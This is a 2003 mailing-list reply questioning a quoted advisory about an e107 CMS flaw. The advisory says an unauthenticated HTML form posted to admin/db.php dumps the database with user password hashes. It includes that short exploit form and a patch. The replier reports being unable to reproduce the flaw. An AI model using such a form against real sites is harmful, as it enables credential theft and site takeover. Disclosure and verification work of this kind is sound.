
Date: 24 Jul 2003 16:21:20 -0400
From: Tim Yohn <tyohn@...banza.com>
To: Artoor Petrovich <artoor@...loyt.com>
Subject: Re: e107 website system Vulnerability


Artoor,

First off, I ask as a concerned party as I use this software quite a bit
and for the fact that the vendor wasn't contacted before a 'High'
severity issue was release to the wild.

I'm currently unable to reproduce this at all.  When I try the exploit
code as provided against e107 (version v0.551beta, not even the latest
version) it takes me to the admin's login page, which doesn't appear to
be a problem to me.  This report says all versions of e107, however as
can be seen that is not the case.  The latest version (v0.555beta) does
not have this vuln either (as I just upgraded my site to make sure it
wasn't still present).  Did you by chance have 'Auto-Login' set for your
admin user on the PC you were testing from, or were you authenticated to
an e107 site as admin already without hitting 'Logout'?

As I said, more info on this would be great since as far as I can tell
this is a not an issue at all or I am just too dense to make the exploit
work as described. 

Thanks,
Tim.

On Thu, 2003-07-24 at 11:49, Artoor Petrovich wrote:
> Informations :
> 
> 
> Advisory Name: e107 website system Vulnerability
> 
> Author: hiruvim <artoor@...loyt.com>
> 
> Discover by: hiruvim <artoor@...loyt.com>
> 
> Website vendor : http://e107.org
> 
> Affected System(s): All versions
> 
> Severity: High
> 
> Platform(s): Windows and Unix
> 
> Issue: Security holes enable attackers to get MySQL dump file with
> users and passwords.
> 
> ==================================================
> Details:
> 
>  In file /admin/db.php
> .......................
> require_once("../class2.php");
> 
> if(IsSet($_POST['dump_sql'])){
>         getsql($mySQLdefaultdb);
>         exit;
> }
> 
> [....]
> require_once("auth.php");
> 
> .......................
> 
> We can do dump_sql without authorization.
> 
> Exploit:
> 
> <form action="http://victim.org/admin/db.php">
> <input type=submit name="dump_sql">
> </form>
> 
> When pressed submit query button we will get MySQL dump file.
>  
> In dump file we will find username and passwd MD5 hash.
> 
> With admin password we can get full site control and access to
> FileManager.
> 
> 
> 
> Vendor: Not contacted yet.
> 
> Patch:
> 
> in /admin/db.php
> 
> Before doing anything you will need tomove "require_once("auth.php");"
> to the top of the file.
> 
> Sorry for my poor english:)
> 
> ==============================
> hiruvim <artoor@...loyt.com>
> Original document can be fount at http://0x90.ipsec.ru/e107.txt
> 



